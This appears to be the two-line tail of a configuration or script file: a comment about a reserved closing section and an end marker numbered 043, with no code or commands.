# (reserved tail - keeps the file closed after the last block)
# @@END 043
